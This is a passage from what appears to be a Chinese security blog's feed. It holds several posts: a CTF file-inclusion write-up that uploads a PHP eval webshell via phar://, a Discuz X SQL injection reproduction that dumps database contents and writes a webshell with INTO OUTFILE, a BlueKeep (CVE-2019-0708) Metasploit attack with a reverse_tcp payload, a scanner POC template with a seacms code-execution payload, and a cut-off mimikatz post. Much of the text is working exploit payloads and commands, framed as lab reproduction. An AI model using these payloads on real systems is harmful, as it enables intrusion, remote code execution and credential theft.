    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:51:23 GMT+0800 (GMT+08:00) --><p>打开题目F12看到一个被注释的跳转。</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/10/1.png"><img src="1.png" alt="img"></a></p><p>访问可以知道是一个文件包含</p><p><img src="F:/youdaoyun/1919010193@qq.com/ef259c04cd7c4709bbfbb04823a96a20/clipboard.png" alt="img">)<a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/10/2.png"><img src="2.png" alt="img"></a></p><p>经过测试，该文件禁止了input、data关键字。并禁止了phar://协议。</p><p>使用php://filter读取题目源码得到</p><p><a href="http://47.94.221.39:8003/index.php?filename=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://47.94.221.39:8003/index.php?filename=php://filter/read=convert.base64-encode/resource=index.php</a></p><p><img src="F:/youdaoyun/1919010193@qq.com/fd9a56009aef499685000019c8f795a1/clipboard.png" alt="img">)<a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/10/3.png"><img src="3.png" alt="img"></a>读取upload.php文件源码如下：</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/10/哇哇.jpg"><img src="%E5%93%87%E5%93%87.jpg" alt="img"></a></p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/10/3333.jpg"><img src="3333.jpg" alt="img"></a></p><p>可以看出upload文件将上传的文件后缀改为txt，文件为重命名了。所以想到利用phar://协议，将一个1.php写入一句话木马，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure><p>压缩为1.zip，后缀名改为1.txt。上传成功，这里我进行访问的使用采用相对路径显示报错，因此我才用的绝对路径包含，构造payload，访问如图</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.94.221.39:8003&#x2F;upload.php?file&#x3D;phar:%2f%2f%2fvar%2fwww%2fhtml%2fupload%2f868b29565d344eccbdd032a0c5a82d9d.txt%2f1</span><br></pre></td></tr></table></figure><p>a=phpinfo();</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/10/4.png"><img src="4.png" alt="img"></a></p><p><img src="F:/youdaoyun/1919010193@qq.com/7fb8807841eb410a8c1fe5438ebf5ac6/clipboard.png" alt="img"></p><p>ls查看一下发现并没有在当前目录。执行以下命令进行搜索</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;system(&#39;find &#x2F; -name &quot;flag&quot;&#39;);</span><br></pre></td></tr></table></figure><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/10/5.png"><img src="5.png" alt="img"></a></p><p><img src="F:/youdaoyun/1919010193@qq.com/309156054db142108507dfae13b2cc43/clipboard.png" alt="img"></p><p>直接显示</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.94.221.39:8003&#x2F;upload.php?file&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;3bef1a5876d201c96ff453db1fdf7be3.txt&#x2F;1</span><br><span class="line"></span><br><span class="line">POST：a&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/10/6.png"><img src="6.png" alt="img"></a></p><p><img src="F:/youdaoyun/1919010193@qq.com/9e8c9a57bdcb4d069d4a7e281a46c4c5/clipboard.png" alt="img"></p><p>unctf{asdasda_LFI_web_234234}</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Tools古典密码加解密工具</title>
    <url>/2020/01/07/CTF-Tools%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:51:23 GMT+0800 (GMT+08:00) --><h1 id="CTF-Tools"><a href="#CTF-Tools" class="headerlink" title="CTF-Tools"></a>CTF-Tools</h1><p><img src="822299460.jpg" alt="1.jpg"></p><p>一款CTF编码、解码、加密、解密工具。</p><h2 id="支持的编码解码"><a href="#支持的编码解码" class="headerlink" title="支持的编码解码:"></a>支持的编码解码:</h2><ul><li>URL-UTF-8</li><li>URL-GB2312</li><li>Unicode</li><li>Escape(%U)</li><li>HtmlEncode</li><li>ACSII</li><li>Base16</li><li>Base32</li><li>Base64</li><li>Str-&gt;Hex</li><li>Shellcode</li></ul><h2 id="支持的加密解密"><a href="#支持的加密解密" class="headerlink" title="支持的加密解密:"></a>支持的加密解密:</h2><ul><li>Rot13</li><li>凯撒密码</li><li>栅栏密码</li><li>培根密码</li><li>摩斯密码</li><li>移位密码</li><li>云影密码</li><li>当铺密码</li><li>维尼吉亚密码</li></ul><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换:"></a>进制转换:</h2><ul><li>2-&gt;8</li><li>2-&gt;10</li><li>2-&gt;16</li><li>8-&gt;2</li><li>8-&gt;10</li><li>8-&gt;16</li><li>10-&gt;2</li><li>10-&gt;8</li><li>10-&gt;16</li><li>16-&gt;2</li><li>16-&gt;8</li><li>16-&gt;10</li><li>任意进制转换</li></ul><h2 id="在线编码网站"><a href="#在线编码网站" class="headerlink" title="在线编码网站:"></a>在线编码网站:</h2><ul><li>Jsfuck</li><li>AAencode</li><li>XXencode</li><li>JJencode</li><li>UUencode</li><li>Brainfuck/Ook!</li><li>敲击码</li><li>猪圈密码</li><li>综合网站</li></ul><p><a href="https://github.com/qianxiao996/CTF-Tools/" target="_blank" rel="noopener">Github:</a><a href="https://github.com/qianxiao996/CTF-Tools/" target="_blank" rel="noopener">https://github.com/qianxiao996/CTF-Tools/</a><br><a href="https://github.com/qianxiao996/CTF-Tools/releases/" target="_blank" rel="noopener">发行版下载地址:</a><a href="https://github.com/qianxiao996/CTF-Tools/releases/" target="_blank" rel="noopener">https://github.com/qianxiao996/CTF-Tools/releases/</a></p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>渗透工具</category>
      </categories>
      <tags>
        <tag>渗透工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Discuz！X系列全版本后台sql注入复现</title>
    <url>/2019/12/11/Discuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:51:23 GMT+0800 (GMT+08:00) --><p>圈子某位大佬公布的0day，拿来刷一刷,漏洞分析请移步大佬文章。<br><a href="https://mp.weixin.qq.com/s/0PaVA9tzOxBFQVZ0EBVc9A" target="_blank" rel="noopener">大佬链接</a></p><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>1、首先去码云下载最新版本的<a href="https://gitee.com/3dming/DiscuzL/attach_files" target="_blank" rel="noopener">discuz</a>（DiscuzX 3.4 R20191201）。</p><p><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C3928872771.png" alt="1.png"></p><p>2、将upaod放置到网站目录下，访问安装目录安装即可。</p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><p>点击站长–UCenter设置<br><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C2705404325.png" alt="2.png"><br>点击最下面的提交进行抓包<br><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C3681277159.png" alt="3.png"></p><h2 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  order by 1   &#x2F;&#x2F;返回正确</span><br><span class="line">1&#39;  order by 2   &#x2F;&#x2F;返回错误</span><br></pre></td></tr></table></figure><h2 id="查询当前用户"><a href="#查询当前用户" class="headerlink" title="查询当前用户"></a>查询当前用户</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(0x7e,(SELECT user())),1)-- a</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C2729740583.png" alt="4.png"></p><h2 id="查询版本"><a href="#查询版本" class="headerlink" title="查询版本"></a>查询版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(0x7e,(SELECT version())),1)-- a</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C1778117842.png" alt="5.png"></p><h2 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1)-- a    &#x2F;&#x2F;mysql</span><br><span class="line">1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1)),1)-- a    &#x2F;&#x2F;information_schema</span><br><span class="line">1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1)),1)-- a    &#x2F;&#x2F;performance_schema</span><br><span class="line">1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 3,1)),1)-- a    &#x2F;&#x2F;sys</span><br><span class="line">1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 4,1)),1)-- a    &#x2F;&#x2F;test</span><br><span class="line">1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1)),1)-- a    &#x2F;&#x2F;ultrax</span><br><span class="line">1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 6,1)),1)-- a    &#x2F;&#x2F;空</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C2586187457.png" alt="6.png"><br><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C2598493174.png" alt="7.png"></p><p>可以发现，共有6个库</p><h2 id="查询数据表"><a href="#查询数据表" class="headerlink" title="查询数据表"></a>查询数据表</h2><p>这里随便找了一个库测试的，test库只有一个表。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(0x7e,(select TABLE_NAME from information_schema.tables where TABLE_SCHEMA&#x3D;&#39;test&#39; limit 0,1)),1)-- a   &#x2F;&#x2F;users</span><br><span class="line">1&#39; and updatexml(1,concat(0x7e,(select TABLE_NAME from information_schema.tables where TABLE_SCHEMA&#x3D;&#39;test&#39; limit 1,1)),1)-- a   &#x2F;&#x2F;空</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C1955246349.png" alt="8.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(0x7e,(select group_concat(TABLE_NAME) from information_schema.tables where TABLE_SCHEMA&#x3D;&#39;mysql&#39;)),1)-- a</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C230185596.png" alt="9.png"></p><h2 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;users&#39;)),1)-- a</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C1990011704.png" alt="10.png"><br>这个没显示全</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(0x7e,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;users&#39; limit 2,1)),1)-- a     &#x2F;&#x2F;user</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C707810195.png" alt="11.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(0x7e,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;users&#39; limit 5,1)),1)-- a  &#x2F;&#x2F;password</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C218761515.png" alt="12.png"></p><h2 id="爆字段值"><a href="#爆字段值" class="headerlink" title="爆字段值"></a>爆字段值</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(0x7e,(select password from test.users limit 1,1)),1)-- a</span><br></pre></td></tr></table></figure><p>成功搞到密码test123<br><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C1598727428.png" alt="13.png"></p><h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><p>Payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; into outfile &#39;c:\\wamp64\\tmp\\1.txt&#39;  -- a</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C3471074862.png" alt="14.png"></p><p>emmmm….<br>The MySQL server is running with the –secure-file-priv option so it cannot execute this statement</p><p>查看一下secure-file-priv配置</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;;</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C1687161249.png" alt="15.png"></p><p>secure_file_priv的值为null，那么secure_file_priv这里都有什么设置呢</p><blockquote><ol><li>secure_file_priv为null 表示不允许导入导出</li><li>secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹</li><li>secure_file_priv没有设置时，则表示没有任何限制</li></ol></blockquote><p>修改mysql.ini文件，加入如下语句</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secure_file_priv&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C4156343786.png" alt="16.png"><br>重启mysql服务</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select &#39;&lt;?php eval($_GET[1])?&gt;&#39; into outfile &#39;C:\\phpstudy_pro\\WWW\\discuz\\1.php&#39;  -- a</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C3510119225.png" alt="17.png"></p><p><a href="http://192.168.91.149/discuz/1.php?1=phpinfo()" target="_blank" rel="noopener">http://192.168.91.149/discuz/1.php?1=phpinfo()</a>;</p><p><img src="D:%5Cblog%5Csource_posts%5CDiscuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%5C2665114479.png" alt="18.png"></p><h1 id="0x03-结束"><a href="#0x03-结束" class="headerlink" title="0x03 结束"></a>0x03 结束</h1><p>吐槽一下，手注真麻烦，还是sqlmap好玩。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-0708 RCE复现</title>
    <url>/2019/09/07/CVE-2019-0708-RCE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:51:23 GMT+0800 (GMT+08:00) --><h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><ul><li><p>192.168.91.136 windows7 6.1.7601</p></li><li><p>192.168.91.151 kali</p><p><strong>Windows7 SP1下载链接:</strong></p></li></ul><p>ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</p><h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="1、首先升级MSF"><a href="#1、首先升级MSF" class="headerlink" title="1、首先升级MSF"></a>1、首先升级MSF</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure><h2 id="2、导入脚本"><a href="#2、导入脚本" class="headerlink" title="2、导入脚本"></a>2、导入脚本</h2><p>然后下载RCE脚本，直接将下载下载的脚本放到对应的目录下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdp.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;lib&#x2F;msf&#x2F;core&#x2F;exploit&#x2F;rdp.rb </span><br><span class="line">rdp_scanner.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner.rb </span><br><span class="line">cve_2019_0708_bluekeep.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;cve_2019_0708_bluekeep.rb </span><br><span class="line">cve_2019_0708_bluekeep_rce.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;exploits&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><p>下载地址：</p><p><a href="https://github.com/NAXG/cve_2019_0708_bluekeep_rce" target="_blank" rel="noopener">https://github.com/NAXG/cve_2019_0708_bluekeep_rce</a></p><h2 id="3、重新加载脚本"><a href="#3、重新加载脚本" class="headerlink" title="3、重新加载脚本"></a>3、重新加载脚本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">reload_all</span><br></pre></td></tr></table></figure><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/1-1.png"><img src="1-1.png" alt="img"></a></p><h2 id="4、攻击"><a href="#4、攻击" class="headerlink" title="4、攻击"></a>4、攻击</h2><p>使用set RHOSTS 受害机IP设置受害机IP</p><p>使用set RPORT 受害机PORT设置受害机RDP端口号</p><p>使用set target ID数字(可选为0-4)设置受害机机器架构</p><p>lhost一般不用设置，payload一定要设置</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce </span><br><span class="line">set lhost 192.168.91.151 </span><br><span class="line">set rhost 192.168.91.136 </span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp </span><br><span class="line">set target 1 </span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/2.jpeg"><img src="2.jpeg" alt="img"></a></p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/3-1.png"><img src="3-1.png" alt="img"></a></p><p>目前这个exp仅适用于 windows7 6.1.7601 windows 2008r2</p><h1 id="END"><a href="#END" class="headerlink" title="END"></a>END</h1><!-- rebuild by neat -->]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>CVE漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>FrameScan-GUI CMS漏洞扫描</title>
    <url>/2019/10/06/FrameScan-GUI-CMS%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:51:23 GMT+0800 (GMT+08:00) --><h1 id="工具简介"><a href="#工具简介" class="headerlink" title="工具简介"></a>工具简介</h1><p>FrameScan-GUI是一款python3和Pyqt编写的具有图形化界面的cms漏洞检测框架，是<a href="https://github.com/qianxiao996/FrameScan" target="_blank" rel="noopener">FrameScan</a>的加强版。支持多种检测方式，支持大多数CMS，可以自定义CMS类型及自行编写POC。旨在帮助有安全经验的安全工程师对已知的应用快速发现漏洞。<a href="https://github.com/qianxiao996/FrameScan-GUI" target="_blank" rel="noopener">Github</a>地址：<a href="https://github.com/qianxiao996/FrameScan-GUI下载地址：https://github.com/qianxiao996/FrameScan-GUI/releases" target="_blank" rel="noopener">https://github.com/qianxiao996/FrameScan-GUI下载地址：https://github.com/qianxiao996/FrameScan-GUI/releases</a></p><h1 id="支持平台"><a href="#支持平台" class="headerlink" title="支持平台"></a>支持平台</h1><p>- Windows</p><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>下载本项目，运行exe即可。<a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/10/1.jpg"><img src="D:%5Cblog%5Csource_posts%5CFrameScan-GUI-CMS%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%5C1.jpg" alt="img"></a></p><h1 id="自定义POC模板"><a href="#自定义POC模板" class="headerlink" title="自定义POC模板"></a>自定义POC模板</h1><p>以下为POC模板，请尽量规范编写。脚本中为示例代码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">name: 漏洞名称（禁止换行）控制在30字以内</span></span><br><span class="line"><span class="string">referer: 漏洞地址（禁止换行）未知请填unknown</span></span><br><span class="line"><span class="string">author: 作者名</span></span><br><span class="line"><span class="string">description: 漏洞描述 </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="comment">#此处编辑检测代码</span></span><br><span class="line">    <span class="comment">#示例代码，请更改result内容，result[0]为漏洞名称,result[1]为返回的内容，result[2]为测试结果</span></span><br><span class="line">    result = [<span class="string">'seacms v6.5.5代码执行漏洞'</span>,<span class="string">''</span>,<span class="string">''</span>]</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"</span></span><br><span class="line">    &#125;</span><br><span class="line">    payload = <span class="string">"searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:as&#123;searchpage:area&#125;&#125;&amp;area=s&#123;searchpage:letter&#125;&amp;letter=ert&#123;searchpage:lang&#125;&amp;yuyan=($_SE&#123;searchpage:jq&#125;&amp;jq=RVER&#123;searchpage:ver&#125;&amp;&amp;ver=[QUERY_STRING]));/*"</span></span><br><span class="line">    url_path = url + <span class="string">"/search.php?phpinfo();"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = requests.get(url_path, timeout=<span class="number">3</span>,headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> data.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'phpinfo'</span> <span class="keyword">in</span> data.text:</span><br><span class="line">            result[<span class="number">2</span>]= <span class="string">"存在"</span></span><br><span class="line">            result[<span class="number">1</span>] = <span class="string">"URL:%s\nPOST:%s"</span>%(url_path,payload)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="number">2</span>] = <span class="string">"不存在"</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print (e)</span></span><br><span class="line">        result[<span class="number">2</span>] =<span class="string">"不存在"</span></span><br><span class="line">        <span class="comment">#这里可设置未知，连接超时等，只有不存在不会显示到结果中。</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">    <span class="comment">#最后一定要返回一个带有3个参数的列表。不然会出错误。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#此处不会调用</span></span><br><span class="line">    warnings.filterwarnings(<span class="string">"ignore"</span>)</span><br><span class="line">    testVuln = run(<span class="string">"http://baidu.com"</span>)</span><br><span class="line">    print(testVuln)</span><br></pre></td></tr></table></figure><h1 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h1><p>POC多数来源于<a href="https://github.com/Sch01ar/AngelSword" target="_blank" rel="noopener">[AngelSword]</a>部分为自己编写，欢迎投递POC</p><p>邮箱地址：<a href="mailto:qianxiao996@126.com">qianxiao996@126.com</a></p><h1 id="警告！"><a href="#警告！" class="headerlink" title="警告！"></a>警告！</h1><p><strong>请勿用于非法用途！否则自行承担一切后果</strong></p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>渗透工具</category>
      </categories>
      <tags>
        <tag>渗透工具</tag>
      </tags>
  </entry>
  <entry>
    <title>meterpreter中使用mimikatz获取windows密码</title>
    <url>/2020/09/12/meterpreter%E4%B8%AD%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96windows%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:51:23 GMT+0800 (GMT+08:00) --><p>进去meterpreter后getuid一下</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/1-2.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/1-2.png" alt="img"></a></p><p>这获得系统管理员权限</p><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="加载mimikatz模块"><a href="#加载mimikatz模块" class="headerlink" title="加载mimikatz模块"></a>加载mimikatz模块</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load mimikatz</span><br></pre></td></tr></table></figure><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/2-1.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/2-1.png" alt="img"></a></p><p>加载成功.</p><h2 id="第一种方法："><a href="#第一种方法：" class="headerlink" title="第一种方法："></a>第一种方法：</h2><h3 id="获取登录密码的hash值"><a 